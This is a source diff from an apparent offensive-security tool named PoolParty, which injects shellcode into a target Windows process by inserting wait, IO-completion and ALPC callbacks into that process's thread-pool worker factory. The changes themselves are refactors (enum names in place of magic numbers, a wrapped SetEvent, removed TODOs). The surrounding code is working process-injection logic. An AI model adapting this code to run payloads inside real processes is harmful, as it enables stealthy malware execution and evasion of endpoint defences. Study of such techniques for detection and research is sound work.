@@ -4,7 +4,6 @@ PoolParty::PoolParty(DWORD dwTargetPid, unsigned char* cShellcode) {
 	m_dwTargetPid = dwTargetPid;
 	m_cShellcode = cShellcode;
 	//m_szShellcodeSize = sizeof(cShellcode);
-	//m_szShellcodeSize = 208; // TODO: Fix this disgusting issue
 	m_szShellcodeSize = 224; // TODO: Fix this disgusting issue
 }
 
@@ -145,8 +144,7 @@ void RemoteWaitCallbackInsertion::SetupExecution() const
 	w_ZwAssociateWaitCompletionPacket(pWait->WaitPkt, *p_hIoCompletion, *p_hEvent, RemoteDirectAddress, RemoteWaitAddress, 0, 0, nullptr);
 	BOOST_LOG_TRIVIAL(info) << "Associated event with the IO completion port of the target process worker factory";
 
-	// TODO: export to a wrapper
-	SetEvent(*p_hEvent);
+	w_SetEvent(*p_hEvent);
 	BOOST_LOG_TRIVIAL(info) << "Set event to queue a packet to the IO completion port of the target process worker factory ";
 }
 
@@ -184,10 +182,9 @@ void RemoteIoCompletionCallbackInsertion::SetupExecution() const
 	FILE_COMPLETION_INFORMATION FileIoCopmletionInformation = { 0 };
 	FileIoCopmletionInformation.Port = *p_hIoCompletion;
 	FileIoCopmletionInformation.Key = &RemoteIoAddress->Direct;
-	w_ZwSetInformationFile(*p_hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), 61); // TODO: Export 0x3D to enum
+	w_ZwSetInformationFile(*p_hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), FileReplaceCompletionInformation);
 	BOOST_LOG_TRIVIAL(info) << boost::format("Associated file `%ws` with the IO completion port of the target process worker factory") % POOL_PARTY_FILE_NAME;
 
-	// TODO: Use std::string instead of C char
 	const std::string Buffer =
 		"Dive right in and make a splash,\n"
 		"We're throwing a pool party in a flash!\n"
@@ -253,7 +250,7 @@ void RemoteAlpcCallbackInsertion::SetupExecution() const
 	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
 	AlpcPortAssociateCopmletionPort.CompletionKey = RemoteTpAlpcAddress;
 	AlpcPortAssociateCopmletionPort.CompletionPort = *p_hIoCompletion;
-	w_NtAlpcSetInformation(hAlpcConnectionPort, 2, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT)); // TODO:  Export 2 to enum
+	w_NtAlpcSetInformation(hAlpcConnectionPort, AlpcAssociateCompletionPortInformation, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));
 	BOOST_LOG_TRIVIAL(info) << boost::format("Associated ALPC port `%ws` with the IO completion port of the target process worker factory") % POOL_PARTY_ALPC_PORT_NAME;
 
 	OBJECT_ATTRIBUTES AlpcClientObjectAttributes = { 0 };
